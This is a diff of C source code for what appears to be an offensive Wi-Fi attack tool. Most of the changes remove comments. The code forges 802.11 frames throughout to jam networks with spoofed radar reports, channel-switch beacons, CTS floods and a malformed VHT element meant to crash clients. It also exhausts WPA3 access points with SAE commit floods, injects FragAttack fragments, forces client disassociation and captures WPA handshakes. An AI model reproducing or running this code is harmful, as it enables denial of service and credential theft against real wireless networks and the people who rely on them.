-        /* IP header stub (ver=4, IHL=5, total_len, TTL=64, proto=ICMP) */
+        
         0x45,
         0x00,
         0x00,
-        0x1C, /* IPv4, 28 bytes total */
+        0x1C, 
         0x00,
         0x00,
         0x40,
-        0x00, /* Don't Fragment */
+        0x00, 
         0x40,
         0x01,
         0x00,
-        0x00, /* TTL=64, Proto=ICMP, checksum=0 */
+        0x00, 
         0xC0,
         0xA8,
         0x01,
-        0x64, /* Src: 192.168.1.100 */
+        0x64, 
         0xC0,
         0xA8,
         0x01,
-        0x01, /* Dst: 192.168.1.1 */
-        /* ICMP Echo Request */
+        0x01, 
+        
         0x08,
         0x00,
         0x00,
-        0x00, /* Type=8 (Echo), Code=0 */
+        0x00, 
         0xDE,
         0xAD,
         0xBE,
-        0xEF, /* Identifier + Seq (marker) */
+        0xEF, 
     };
     memcpy(b + o, default_payload, sizeof(default_payload));
     o += sizeof(default_payload);
@@ -1342,71 +1301,59 @@ static int mk_frag_payload(uint8_t *b, const uint8_t bss[6],
  *  Reference: IEEE 802.11-2020 §11.9 (DFS), §9.4.2.22 (Meas Report)
  * ============================================================ */
 
-/* Prefer a non-DFS redirect so vacate CSA lands on a usable channel */
+
 static uint8_t pick_safe_ch(uint8_t cur, uint8_t preferred) {
   if (valid_ch(preferred) && !is_dfs_ch(preferred))
     return preferred;
   if (cur >= 36)
-    return 36; /* UNII-1 */
+    return 36; 
   return 1;
 }
 
-/*
- * mk_dfs_radar_report — Spectrum Management Measurement Report
- *
- * Action Category 0 / Action 1 with Measurement Report IE (ID=39)
- * Basic Report Map bit 3 set → Radar Detected.
- * Addressed Client→AP so the AP processes the radar claim.
- */
+
 static int mk_dfs_radar_report(uint8_t *b, const uint8_t bss[6],
                                const uint8_t cli[6], uint8_t cur_ch, uint8_t token) {
   int o = 0;
   o += mk_rt(b + o);
-  /* Client → AP (addr1=BSSID, addr2=Client, addr3=BSSID) */
+  
   o += mk_dot11(b + o, FC_ACTION, bss, cli, bss, 0);
 
-  b[o++] = 0; /* Category: Spectrum Management */
-  b[o++] = 1; /* Action: Measurement Report */
+  b[o++] = 0; 
+  b[o++] = 1; 
   b[o++] = token; /* [UPGRADE] Dynamic Dialog Token */
 
   /* [UPGRADE] Cascading DFS Lockout (Multi-Channel Strike) */
-  /* Target the current channel + major DFS sub-bands (52, 100, 132) */
+  
   uint8_t target_channels[] = { cur_ch, 52, 100, 132 };
   int num_targets = sizeof(target_channels);
 
-  /* Build a Measurement Report IE for each target channel */
+  
   for (int i = 0; i < num_targets; i++) {
-      b[o++] = 39;     /* Element ID: Measurement Report */
-      b[o++] = 15;     /* Length */
-      b[o++] = (uint8_t)(i + 1); /* Measurement Token */
-      b[o++] = 0;      /* Report Mode: success (not late/incapable/refused) */
-      b[o++] = 0;      /* Measurement Type: Basic Report */
-      b[o++] = target_channels[i]; /* Channel Number under test */
+      b[o++] = 39;     
+      b[o++] = 15;     
+      b[o++] = (uint8_t)(i + 1); 
+      b[o++] = 0;      
+      b[o++] = 0;      
+      b[o++] = target_channels[i]; 
 
-      /* Measurement Start Time (8 bytes TSF) */
+      
       uint64_t tsf = htole64(mono_us());
       memcpy(b + o, &tsf, 8);
       o += 8;
 
-      /* Measurement Duration (TU) */
+      
       uint16_t dur = htole16(50);
       memcpy(b + o, &dur, 2);
       o += 2;
 
-      /* Basic Report Map: bit3 = Radar (0x08) */
+      
       b[o++] = 0x08;
   }
 
   return o;
 }
 
-/*
- * mk_dfs_vacate_csa — Spoofed AP Channel Switch after "radar"
- *
- * Beacon from BSSID with CSA IE mode=1 (stop TX until switch),
- * count=0 (immediate). Forces clients off-channel and simulates
- * the AP's regulatory DFS vacation announcement.
- */
+
 static int mk_dfs_vacate_csa(uint8_t *b, const uint8_t bss[6], const char *ssid,
                              uint8_t cur_ch, uint8_t safe_ch) {
   int o = 0;
@@ -1416,7 +1363,7 @@ static int mk_dfs_vacate_csa(uint8_t *b, const uint8_t bss[6], const char *ssid,
   beacon_fix_t *f = (beacon_fix_t *)(b + o);
   f->ts = htole64(mono_us());
   f->interval = htole16(100);
-  f->cap = htole16(0x0031); /* ESS + Spectrum Management capable */
+  f->cap = htole16(0x0031); 
   o += sizeof(beacon_fix_t);
 
   int sl = (int)strlen(ssid);
@@ -1429,29 +1376,29 @@ static int mk_dfs_vacate_csa(uint8_t *b, const uint8_t bss[6], const char *ssid,
 
   o += mk_ds_ie(b + o, cur_ch);
 
-  /* CSA IE — immediate TX stop + channel vacation */
+  
   b[o++] = 37;
   b[o++] = 3;
   csa_ie_t *c = (csa_ie_t *)(b + o);
-  c->mode = 1; /* stop transmission until channel switch */
+  c->mode = 1; 
   c->ch = safe_ch;
-  c->count = 0; /* switch immediately */
+  c->count = 0; 
   o += sizeof(csa_ie_t);
 
   /* [UPGRADE] Extended CSA IE (ID=60, len=4) for modern 5GHz clients */
   b[o++] = 60;
   b[o++] = 4;
-  b[o++] = 1; /* switch mode */
-  b[o++] = 115; /* operating class (always 5G for DFS) */
+  b[o++] = 1; 
+  b[o++] = 115; 
   b[o++] = safe_ch;
-  b[o++] = 0; /* switch count */
+  b[o++] = 0; 
 
   /* [UPGRADE] Quiet Element (IE 40) to enforce radio silence on old channel */
   b[o++] = 40;
   b[o++] = 6;
-  b[o++] = 1; /* quiet count */
-  b[o++] = 1; /* quiet period */
-  uint16_t qdur = htole16(100); /* 100 TU radio silence */
+  b[o++] = 1; 
+  b[o++] = 1; 
+  uint16_t qdur = htole16(100); 
   memcpy(b + o, &qdur, 2); o += 2;
   uint16_t qoff = htole16(0);
   memcpy(b + o, &qoff, 2); o += 2;
@@ -1459,10 +1406,10 @@ static int mk_dfs_vacate_csa(uint8_t *b, const uint8_t bss[6], const char *ssid,
   /* [UPGRADE] IE 192 (VHT Operation) Malformation - 160MHz Kernel Panic for 5GHz */
   b[o++] = 192;
   b[o++] = 5;
-  b[o++] = 2;   /* Channel Width: 160 MHz */
-  b[o++] = 255; /* Center Freq 1: Out of Bounds */
-  b[o++] = 255; /* Center Freq 2: Out of Bounds */
-  b[o++] = 0xff; /* Basic MCS Set */
+  b[o++] = 2;   
+  b[o++] = 255; 
+  b[o++] = 255; 
+  b[o++] = 0xff; 
   b[o++] = 0xff;
 
   return o;
@@ -1489,18 +1436,17 @@ static int mk_cts_nav(uint8_t *b, const uint8_t ra[6]) {
   int o = 0;
   o += mk_rt(b + o);
 
-  /* CTS is a Control frame — only has RA, no addr2/addr3 in the
-     standard format. We build it manually instead of mk_dot11. */
+  
   uint16_t fc = htole16(FC_CTS);
   memcpy(b + o, &fc, 2);
   o += 2;
 
-  /* Duration/NAV: maximum value = 32767 µs (bit 15 = 0, bits 14:0 = max) */
+  
   uint16_t dur = htole16(32767);
   memcpy(b + o, &dur, 2);
   o += 2;
 
-  /* Receiver Address (RA) — broadcast to silence everyone */
+  
   memcpy(b + o, ra, 6);
   o += 6;
 
@@ -1528,40 +1474,30 @@ static int mk_sae_commit(uint8_t *b, const uint8_t bss[6],
                          const uint8_t cli[6], uint16_t group_id) {
   int o = 0;
   o += mk_rt(b + o);
-  /* Client → AP: addr1=BSSID, addr2=Client, addr3=BSSID */
+  
   o += mk_dot11(b + o, FC_AUTH, bss, cli, bss, 0);
 
-  /* Authentication Algorithm: SAE (3) */
+  
   uint16_t algo = htole16(3);
   memcpy(b + o, &algo, 2);
   o += 2;
 
-  /* Auth Transaction Sequence: 1 (Commit) */
+  
   uint16_t txseq = htole16(1);
   memcpy(b + o, &txseq, 2);
   o += 2;
 
-  /* Status Code: 0 (Success / requesting commit) */
+  
   uint16_t status = htole16(0);
   memcpy(b + o, &status, 2);
   o += 2;
 
-  /* SAE Commit Body:
-   * Finite Cyclic Group */
+  
   uint16_t group = htole16(group_id);
   memcpy(b + o, &group, 2);
   o += 2;
 
-  /* [MAXIMUM LEVEL UPGRADE]
-   * 1. Dynamic lengths based on Group ID.
-   * 2. If we just send random bytes for the Element, the AP's ECC library
-   *    (e.g., hostapd's crypto_ec_point_from_bin) will instantly reject it
-   *    because the point is not on the curve, skipping the heavy ECDH math!
-   * 3. To force maximum CPU exhaustion, we MUST supply a VALID curve point.
-   *    We hardcode the standard Generator (G) point for each curve. The AP
-   *    doesn't care it's the generator; it just sees a valid point and proceeds
-   *    to do the extremely expensive scalar * element multiplication!
-   */
+  
   static const uint8_t P256_G[64] = {
       0x6b, 0x17, 0xd1, 0xf2, 0xe1, 0x2c, 0x42, 0x47, 0xf8, 0xbc, 0xe6, 0xe5, 0x63, 0xa4, 0x40, 0xf2,
       0x77, 0x03, 0x7d, 0x81, 0x2d, 0xeb, 0x33, 0xa0, 0xf4, 0xa1, 0x39, 0x45, 0xd8, 0x98, 0xc2, 0x96,
@@ -1602,7 +1538,7 @@ static int mk_sae_commit(uint8_t *b, const uint8_t bss[6],
     elem_len = 132;
   }
 
-  /* Scalar — Random bits to force unique key derivation each time */
+  
   static __thread xorshift64_t sae_rng;
   static __thread bool sae_rng_init = false;
   if (!sae_rng_init) {
@@ -1615,7 +1551,7 @@ static int mk_sae_commit(uint8_t *b, const uint8_t bss[6],
   }
   o += scalar_len;
 
-  /* Element — Must be a valid curve point to trigger ECDH math. */
+  
   memcpy(b + o, elem_ptr, elem_len);
   o += elem_len;
 
@@ -1644,58 +1580,49 @@ static int mk_bss_transition(uint8_t *b, const uint8_t bss[6],
                              const uint8_t cli[6]) {
   int o = 0;
   o += mk_rt(b + o);
-  /* AP → Client: addr1=Client, addr2=BSSID, addr3=BSSID */
+  
   o += mk_dot11(b + o, FC_ACTION, cli, bss, bss, 0);
 
-  /* Category: WNM (10) */
+  
   b[o++] = 10;
-  /* Action: BSS Transition Management Request (7) */
+  
   b[o++] = 7;
-  /* Dialog Token */
+  
   b[o++] = 1;
 
-  /* Request Mode:
-   *   bit 0: Preferred Candidate List Included = 1
-   *   bit 2: Disassociation Imminent = 1
-   *   => 0x05 */
+  
   b[o++] = 0x05;
 
-  /* Disassociation Timer: 10 TBTTs (~1 second at 100 TU interval) */
+  
   uint16_t disassoc_timer = htole16(10);
   memcpy(b + o, &disassoc_timer, 2);
   o += 2;
 
-  /* Validity Interval: 20 TBTTs */
+  
   b[o++] = 20;
 
-  /* BSS Termination Duration: not included (bit 3 = 0) */
+  
 
   /* --- Neighbor Report IE (ID=52) --- */
-  b[o++] = 52; /* Element ID: Neighbor Report */
-  b[o++] = 13; /* Length: BSSID(6) + BSSID Info(4) + OpClass(1) + Channel(1) +
-                  PhyType(1) */
+  b[o++] = 52; 
+  b[o++] = 13; 
 
-  /* Target BSSID: a spoofed BSSID (randomized per call via caller) */
+  
   uint8_t rogue_bssid[6];
   rand_mac(rogue_bssid);
   memcpy(b + o, rogue_bssid, 6);
   o += 6;
 
-  /* BSSID Information (4 bytes):
-   *   bit 0: AP Reachable = 1
-   *   bit 1: Security compatible = 1
-   *   bit 2: Key Scope match = 1
-   *   bit 4: Spectrum Mgmt capable = 1
-   *   => 0x00000017 */
+  
   uint32_t bssid_info = htole32(0x00000017);
   memcpy(b + o, &bssid_info, 4);
   o += 4;
 
-  /* Operating Class: 81 (2.4 GHz channels 1-13) */
+  
   b[o++] = 81;
-  /* Channel Number: 6 (common default) */
+  
   b[o++] = 6;
-  /* PHY Type: 7 (HT) */
+  
   b[o++] = 7;
 
   return o;
@@ -1721,56 +1648,53 @@ static int mk_beacon_report_req(uint8_t *b, const uint8_t bss[6],
                                 const uint8_t cli[6], uint8_t cur_ch) {
   int o = 0;
   o += mk_rt(b + o);
-  /* AP → Client: addr1=Client, addr2=BSSID, addr3=BSSID */
+  
   o += mk_dot11(b + o, FC_ACTION, cli, bss, bss, 0);
 
-  /* Category: Radio Measurement (5) */
+  
   b[o++] = 5;
-  /* Action: Radio Measurement Request (0) */
+  
   b[o++] = 0;
-  /* Dialog Token */
+  
   b[o++] = 1;
-  /* Number of Repetitions: 65535 (maximum — repeat forever) */
+  
   uint16_t reps = htole16(0xFFFF);
   memcpy(b + o, &reps, 2);
   o += 2;
 
   /* --- Measurement Request IE (ID=38) --- */
-  b[o++] = 38; /* Element ID: Measurement Request */
-  b[o++] = 14; /* Length */
-  b[o++] = 1;  /* Measurement Token */
-  /* Request Mode:
-   *   bit 1: Enable = 1
-   *   bit 3: Report = 1  (demand immediate report)
-   *   => 0x0A */
+  b[o++] = 38; 
+  b[o++] = 14; 
+  b[o++] = 1;  
+  
   b[o++] = 0x0A;
-  /* Measurement Type: 5 (Beacon Report) */
+  
   b[o++] = 5;
 
   /* --- Beacon Report subelement --- */
-  /* Operating Class: 81 (global 2.4 GHz) — scan all 2.4GHz */
+  
   b[o++] = 81;
-  /* Channel Number: 0 = scan ALL channels in this operating class */
+  
   b[o++] = 0;
 
-  /* Randomization Interval: 0 (start immediately) */
+  
   uint16_t rand_int = htole16(0);
   memcpy(b + o, &rand_int, 2);
   o += 2;
 
-  /* Measurement Duration: 1000 TU (~1 second per channel) */
+  
   uint16_t meas_dur = htole16(1000);
   memcpy(b + o, &meas_dur, 2);
   o += 2;
 
-  /* Measurement Mode: 0 = Passive (forces full dwell time per channel) */
+  
   b[o++] = 0;
 
-  /* BSSID: wildcard (FF:FF:FF:FF:FF:FF) — report ALL APs */
+  
   memcpy(b + o, BCAST, 6);
   o += 6;
 
-  (void)cur_ch; /* channel context available for future enhancements */
+  (void)cur_ch; 
 
   return o;
 }
@@ -1792,17 +1716,17 @@ typedef struct {
   pkt_t disassoc_bcast;
   pkt_t eapol_logoff;
   pkt_t csa_action[4];
-  pkt_t probe_resp[4];    /* unicast to client */
+  pkt_t probe_resp[4];    
   pkt_t probe_resp_bc[4]; /* [FIX 8] broadcast variant */
   pkt_t delba;
   pkt_t confusion;
   pkt_t auth_pool[MAX_AUTH_POOL];
-  /* FragAttack: two-fragment pair for plaintext injection */
-  pkt_t frag_setup;   /* Fragment 0: LLC/SNAP + partial ARP (MoreFrag=1) */
-  pkt_t frag_payload; /* Fragment 1: injected payload tail (MoreFrag=0) */
-  /* DFS Fake Radar: Measurement Report + vacate CSA pair */
-  pkt_t dfs_radar_report; /* Spectrum Mgmt Measurement Report (Radar bit) */
-  pkt_t dfs_vacate_csa;   /* Spoofed AP CSA beacon forcing channel vacation */
+  
+  pkt_t frag_setup;   
+  pkt_t frag_payload; 
+  
+  pkt_t dfs_radar_report; 
+  pkt_t dfs_vacate_csa;   
   /* Vector #17: CTS/RTS Virtual Jammer */
   pkt_t cts_nav;
   /* Vector #18: WPA3 SAE Hunting (pre-built with random cli, refreshed per-use)
@@ -1879,13 +1803,13 @@ static bool factory_build(factory_t *f, const target_ap_t *t, int new_ch,
   f->delba.len = mk_delba(f->delba.buf, bss, cli);
   f->confusion.len = mk_confusion_beacon(f->confusion.buf, t->ssid, cur_ch);
 
-  /* FragAttack: build paired fragments with shared seq number */
-  uint16_t frag_seq = 42; /* fixed seq for fragment pairing */
+  
+  uint16_t frag_seq = 42; 
   f->frag_setup.len = mk_frag_setup(f->frag_setup.buf, bss, cli, frag_seq);
   f->frag_payload.len =
       mk_frag_payload(f->frag_payload.buf, bss, cli, frag_seq, NULL, 0);
 
-  /* DFS Fake Radar: Measurement Report (radar) + vacate CSA pair */
+  
   uint8_t safe = pick_safe_ch(cur_ch, (uint8_t)new_ch);
   f->dfs_radar_report.len =
       mk_dfs_radar_report(f->dfs_radar_report.buf, bss, cli, cur_ch, 42);
@@ -1896,7 +1820,7 @@ static bool factory_build(factory_t *f, const target_ap_t *t, int new_ch,
   f->cts_nav.len = mk_cts_nav(f->cts_nav.buf, BCAST);
 
   /* Vector #18: WPA3 SAE Hunting — SAE Commit from random clients */
-  uint16_t sae_groups[] = {19, 20, 21}; /* P-256, P-384, P-521 */
+  uint16_t sae_groups[] = {19, 20, 21}; 
   for (int i = 0; i < MAX_AUTH_POOL; i++) {
     uint8_t fm[6];
     rand_mac(fm);
@@ -1964,8 +1888,8 @@ static pkt_set_t factory_get(factory_t *f, attack_vector_t v) {
   case VEC_PROBE_RESPONSE_CSA:
     /* [UPGRADE] Burst Countdown */
     for (int i = 0; i < 4 && s.n < 30; i++) {
-        s.p[s.n++] = &f->probe_resp[i];    /* unicast */
-        s.p[s.n++] = &f->probe_resp_bc[i]; /* broadcast */
+        s.p[s.n++] = &f->probe_resp[i];    
+        s.p[s.n++] = &f->probe_resp_bc[i]; 
     }
     break;
   case VEC_DELBA_ATTACK:
@@ -1976,12 +1900,12 @@ static pkt_set_t factory_get(factory_t *f, attack_vector_t v) {
       s.p[s.n++] = &f->auth_pool[i];
     break;
   case VEC_FRAGATTACK:
-    /* Fragment pair must be injected in order: setup → payload */
+    
     s.p[s.n++] = &f->frag_setup;
     s.p[s.n++] = &f->frag_payload;
     break;
   case VEC_DFS_FAKE_RADAR:
-    /* Radar claim first, then spoofed AP vacation CSA */
+    
     s.p[s.n++] = &f->dfs_radar_report;
     s.p[s.n++] = &f->dfs_vacate_csa;
     break;
@@ -2000,9 +1924,9 @@ static pkt_set_t factory_get(factory_t *f, attack_vector_t v) {
     break;
   /* [FIX 3] Non-injection vectors: handled by other engines */
   case VEC_PMKID_CAPTURE:
-    break; /* capture thread */
+    break; 
   case VEC_POWER_SAVE:
-    break; /* not yet implemented */
+    break; 
   case VEC_COUNT:
     break;
   }
@@ -2068,7 +1992,7 @@ static double rate_sleep(rate_ctrl_t *r, uint64_t thread_sent) {
   double now = mono_time();
   double window_elapsed = now - r->window_start;
 
-  /* Reset window every 1 second */
+  
   if (window_elapsed >= 1.0) {
     r->window_sent = 0;
     r->window_start = now;
@@ -2148,7 +2072,7 @@ static void *inject_thread(void *arg) {
         pkt_t *src = a->pkts.p[idx % a->pkts.n];
         memcpy(&batch[bcount], src, sizeof(pkt_t));
 
-        /* Update sequence number */
+        
         if (batch[bcount].len >
             (int)(sizeof(rt_hdr_t) + offsetof(dot11_t, seq) + 2)) {
           dot11_t *dot = (dot11_t *)(batch[bcount].buf + sizeof(rt_hdr_t));
@@ -2218,7 +2142,7 @@ static void engine_init(engine_t *e, config_t *c, factory_t *f) {
 
 /* [FIX 13] Count threads first, then create with checked pthread_create */
 static void engine_start(engine_t *e) {
-  /* Count how many threads we'll need */
+  
   int planned = 0;
   for (int v = 0; v < VEC_COUNT; v++) {
     if (!e->cfg->vec_on[v])
@@ -2341,7 +2265,7 @@ static void *ch_lock_thread(void *arg) {
   ch_arg_t *a = (ch_arg_t *)arg;
   while (!g_stop) {
     set_ch(a->iface, a->ch);
-    /* Only lock iface2 if dual AND rogue AP is NOT using iface2 */
+    
     if (a->dual && a->iface2[0] && !a->rogue_on_iface2)
       set_ch(a->iface2, a->ch);
     usleep_precise(1.5);
@@ -2420,13 +2344,13 @@ static void *capture_thread(void *arg) {
       char frame_bssid[MAX_MAC_STR];
       format_mac(d->a3, frame_bssid);
       if (a->target_bssid[0] && memcmp(d->a3, target_bss, 6) != 0)
-        break; /* not our target */
+        break; 
 
       /* [UPGRADE] Check if it's an EAPOL packet (any of M1-M4) */
-      /* EAPOL Key starts after LLC/SNAP (8 bytes) + EAPOL header (4 bytes) */
-      ssize_t eapol_start = i + 2; /* past 0x888E */
+      
+      ssize_t eapol_start = i + 2; 
       if (eapol_start + 4 + 2 < n) {
-        /* If it's an EAPOL packet, we save it to our PCAP file */
+        
         char pcap_name[128];
         time_t now = time(NULL);
         struct tm *tm = localtime(&now);
@@ -2434,9 +2358,9 @@ static void *capture_thread(void *arg) {
                  "./out/veritas_handshake_%04d%02d%02d.pcap", tm->tm_year + 1900,
                  tm->tm_mon + 1, tm->tm_mday);
 
-        FILE *fp = fopen(pcap_name, "ab"); /* Append mode (binary) */
+        FILE *fp = fopen(pcap_name, "ab"); 
         if (fp) {
-          /* Check if file is empty, write global header if it is */
+          
           fseek(fp, 0, SEEK_END);
           if (ftell(fp) == 0) {
             pcap_hdr_t ph = {
@@ -2446,7 +2370,7 @@ static void *capture_thread(void *arg) {
                 .thiszone = 0,
                 .sigfigs = 0,
                 .snaplen = 65535,
-                .network = 105 /* IEEE 802.11 */
+                .network = 105 
             };
             fwrite(&ph, sizeof(ph), 1, fp);
           }
@@ -2454,9 +2378,7 @@ static void *capture_thread(void *arg) {
           struct timeval pcap_tv;
           gettimeofday(&pcap_tv, NULL);
           
-          /* The packet we received from raw socket might not have a radiotap header 
-             if it's not a monitor interface (unlikely here, but good to be safe). 
-             We write exactly what we captured (which includes the Radiotap). */
+          
           pcaprec_hdr_t pr = {
               .ts_sec = (uint32_t)pcap_tv.tv_sec,
               .ts_usec = (uint32_t)pcap_tv.tv_usec,
@@ -2616,10 +2538,10 @@ static void stop_rogue(const char *iface2) {
         break;
       usleep_precise(0.5);
     }
-    waitpid(g_rogue, NULL, 0); /* final reap */
+    waitpid(g_rogue, NULL, 0); 
     g_rogue = -1;
 
-    /* Restore interface to monitor mode */
+    
     if (g_rogue_iface[0]) {
       char cmd[128];
       snprintf(cmd, sizeof(cmd), "ip link set %s down 2>/dev/null",
@@ -3357,7 +3279,7 @@ static bool jbool(const char *j, const char *k, bool *o) {
     *o = false;
     return true;
   }
-  /* Also accept 1/0 */
+  
   if (*p == '1') {
     *o = true;
     return true;
@@ -3654,7 +3576,7 @@ static void print_help(void) {
 #define STRESS_MAX_APS 128
 #define STRESS_AGE_SEC 60.0
 
-/* Channel tables */
+
 static const int CH_24[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};
 static const int CH_5[] = {36,  40,  44,  48,  52,  56,  60,  64,
                            100, 104, 108, 112, 116, 120, 124, 128,
@@ -3679,7 +3601,7 @@ typedef struct {
   pthread_mutex_t lock;
 } stress_pool_t;
 
-/* Global stress state */
+
 static _Atomic int g_stress_ch = 0;
 static _Atomic int g_stress_aps_seen = 0;
 
@@ -3693,7 +3615,7 @@ static void stress_pool_add(stress_pool_t *p, const uint8_t bssid[6],
                             const char *enc) {
   pthread_mutex_lock(&p->lock);
 
-  /* Update existing? */
+  
   for (int i = 0; i < p->count; i++) {
     if (memcmp(p->aps[i].bssid, bssid, 6) == 0) {
       p->aps[i].last_seen = mono_time();
@@ -3712,7 +3634,7 @@ static void stress_pool_add(stress_pool_t *p, const uint8_t bssid[6],
     }
   }
 
-  /* Add new */
+  
   if (p->count < STRESS_MAX_APS) {
     stress_ap_t *a = &p->aps[p->count];
     memcpy(a->bssid, bssid, 6);
@@ -3731,7 +3653,7 @@ static void stress_pool_add(stress_pool_t *p, const uint8_t bssid[6],
   pthread_mutex_unlock(&p->lock);
 }
 
-/* Remove stale entries */
+
 static void stress_pool_age(stress_pool_t *p) {
   double now = mono_time();
   pthread_mutex_lock(&p->lock);
@@ -3748,7 +3670,7 @@ static void stress_pool_age(stress_pool_t *p) {
   pthread_mutex_unlock(&p->lock);
 }
 
-/* Snapshot: copy current pool under lock and sort by RSSI (closest first) */
+
 static int stress_pool_snapshot(stress_pool_t *p, stress_ap_t *out, int max) {
   pthread_mutex_lock(&p->lock);
   int n = p->count < max ? p->count : max;
@@ -3768,7 +3690,7 @@ static int stress_pool_snapshot(stress_pool_t *p, stress_ap_t *out, int max) {
   return n;
 }
 
-/* Radiotap dBm Antenna Signal Extractor (bit 5) */
+
 static int8_t parse_radiotap_rssi(const uint8_t *buf, uint16_t rt_len) {
   if (rt_len < 8)
     return -100;
@@ -3786,25 +3708,25 @@ static int8_t parse_radiotap_rssi(const uint8_t *buf, uint16_t rt_len) {
     off += 4;
   }
 
-  if (present & (1 << 5)) { /* IEEE80211_RADIOTAP_DBM_ANTSIGNAL */
+  if (present & (1 << 5)) { 
     if (present & (1 << 0)) {
       while (off % 8 != 0)
         off++;
-      off += 8; /* TSFT */
+      off += 8; 
     }
     if (present & (1 << 1))
-      off += 1; /* Flags */
+      off += 1; 
     if (present & (1 << 2))
-      off += 1; /* Rate */
+      off += 1; 
     if (present & (1 << 3)) {
       while (off % 2 != 0)
         off++;
-      off += 4; /* Channel */
+      off += 4; 
     }
     if (present & (1 << 4)) {
       while (off % 2 != 0)
         off++;
-      off += 2; /* FHSS */
+      off += 2; 
     }
     if (off < (int)rt_len) {
       int8_t sig = (int8_t)buf[off];
@@ -3834,7 +3756,7 @@ static void *stress_scanner_thread(void *arg) {
   struct timeval tv = {.tv_sec = 0, .tv_usec = 200000};
   setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
 
-  /* Ignore own injected packets */
+  
 #ifndef PACKET_IGNORE_OUTGOING
 #define PACKET_IGNORE_OUTGOING 23
 #endif
@@ -3848,29 +3770,29 @@ static void *stress_scanner_thread(void *arg) {
    * so we must read bytes individually to construct the correct length.
    */
   struct sock_filter bpf_code[] = {
-      /* A = buf[2] (rt_len LSB) */
+      
       BPF_STMT(BPF_LD | BPF_B | BPF_ABS, 2),
-      /* X = A */
+      
       BPF_STMT(BPF_MISC | BPF_TAX, 0),
-      /* A = buf[3] (rt_len MSB) */
+      
       BPF_STMT(BPF_LD | BPF_B | BPF_ABS, 3),
-      /* A = A << 8 */
+      
       BPF_STMT(BPF_ALU | BPF_LSH | BPF_K, 8),
-      /* A = A + X (A now contains little-endian rt_len) */
+      
       BPF_STMT(BPF_ALU | BPF_ADD | BPF_X, 0),
-      /* X = A (Transfer rt_len to X for indexed addressing) */
+      
       BPF_STMT(BPF_MISC | BPF_TAX, 0),
 
-      /* A = buf[X + 0] (Load Frame Control byte 1) */
+      
       BPF_STMT(BPF_LD | BPF_B | BPF_IND, 0),
-      /* A = A & 0x0C (Mask the Type bits: 0000 1100) */
+      
       BPF_STMT(BPF_ALU | BPF_AND | BPF_K, 0x0C),
-      /* If A == 0 (Management Frame), jump 0 (keep), else jump 1 (drop) */
+      
       BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 0, 0, 1),
 
-      /* keep: ret -1 (return whole packet) */
+      
       BPF_STMT(BPF_RET | BPF_K, ~0U),
-      /* drop: ret 0 (drop packet) */
+      
       BPF_STMT(BPF_RET | BPF_K, 0),
   };
   struct sock_fprog bpf_prog = {
@@ -3893,18 +3815,18 @@ static void *stress_scanner_thread(void *arg) {
   double last_probe_time = mono_time();
 
   while (!g_stop) {
-    /* Active Probe Request sweep when unmask_hidden is enabled */
+    
     if (a->unmask_hidden) {
       double now = mono_time();
       if (now - last_probe_time >= 1.0) {
         last_probe_time = now;
         uint8_t pb[256];
         
-        /* 1. Send Wildcard Probe Request */
+        
         int plen = mk_probe_req(pb, BCAST, NULL);
         inject_one(sock, pb, plen);
         
-        /* 2. Send Targeted Probe Requests based on harvested SSIDs */
+        
         for (int i = 0; i < harvest_cnt; i++) {
           if (harvest_pool[i][0]) {
             plen = mk_probe_req(pb, BCAST, harvest_pool[i]);
@@ -3919,7 +3841,7 @@ static void *stress_scanner_thread(void *arg) {
       continue;
 
 
-    /* Parse radiotap length */
+    
     uint16_t rt_len = 0;
     memcpy(&rt_len, buf + 2, 2);
     rt_len = le16toh(rt_len);
@@ -3928,13 +3850,12 @@ static void *stress_scanner_thread(void *arg) {
     uint8_t type = (fc >> 2) & 0x03;
     uint8_t subtype = (fc >> 4) & 0x0F;
 
-    /* Check management frames: Beacon (type=0, subtype=8), Probe Resp (0,5),
-     * Probe Req (0,4) */
+    
     if (type != 0)
       continue;
 
     if (subtype == 8 || subtype == 5) {
-      /* Beacon (8) or Probe Response (5) */
+      
       uint8_t *bssid = d->a2;
       if (bssid[0] & 0x01)
         continue;
@@ -3964,7 +3885,7 @@ static void *stress_scanner_thread(void *arg) {
           break;
 
         if (ie_id == 0 && ie_len > 0 && ie_len <= MAX_SSID_LEN) {
-          /* SSID IE */
+          
           memcpy(ssid, buf + ie_off + 2, ie_len);
           ssid[ie_len] = 0;
           bool printable = true;
@@ -3977,10 +3898,10 @@ static void *stress_scanner_thread(void *arg) {
           if (!printable)
             ssid[0] = 0;
         } else if (ie_id == 3 && ie_len == 1) {
-          /* DS Parameter Set → channel */
+          
           channel = buf[ie_off + 2];
         } else if (ie_id == 48 && ie_len >= 12) {
-          /* RSN IE (WPA2 / WPA3) */
+          
           snprintf(enc, sizeof(enc), "WPA2");
           const uint8_t *ie_ptr = buf + ie_off + 2;
           if (ie_len >= 8) {
@@ -4001,7 +3922,7 @@ static void *stress_scanner_thread(void *arg) {
             }
           }
         } else if (ie_id == 221 && ie_len >= 6) {
-          /* Vendor IE (WPA1) */
+          
           const uint8_t *vp = buf + ie_off + 2;
           if (vp[0] == 0x00 && vp[1] == 0x50 && vp[2] == 0xF2 &&
               vp[3] == 0x02) {
@@ -4024,8 +3945,7 @@ static void *stress_scanner_thread(void *arg) {
         stress_pool_add(a->pool, bssid, ssid, channel, rssi, enc);
       }
     } else if (subtype == 4) {
-      /* Probe Request (4): unmask hidden SSIDs from directed client probe
-       * requests */
+      
       int ie_off = rt_len + sizeof(dot11_t);
       if (ie_off >= n)
         continue;
@@ -4055,13 +3975,13 @@ static void *stress_scanner_thread(void *arg) {
       }
 
       if (ssid[0]) {
-        /* Add to stress pool if directed probe */
+        
         if (!(d->a3[0] & 0x01)) {
           int8_t rssi = parse_radiotap_rssi(buf, rt_len);
           stress_pool_add(a->pool, d->a3, ssid, 0, rssi, "");
         }
         
-        /* SSID Harvesting logic: store ambient SSID for unmasking */
+        
         if (a->unmask_hidden) {
           bool found = false;
           for (int i = 0; i < harvest_cnt; i++) {
@@ -4078,7 +3998,7 @@ static void *stress_scanner_thread(void *arg) {
       }
     }
 
-    /* Periodically age out stale entries */
+    
     static int age_counter = 0;
     if (++age_counter >= 500) {
       age_counter = 0;
@@ -4146,7 +4066,7 @@ static bool wildcard_match(const char *pattern, const char *str) {
 typedef struct {
   stress_cfg_t *cfg;
   stress_pool_t *pool;
-  int band; /* 2 = 2.4GHz only, 5 = 5GHz only, 0 = both */
+  int band; 
   char iface[MAX_IFACE];
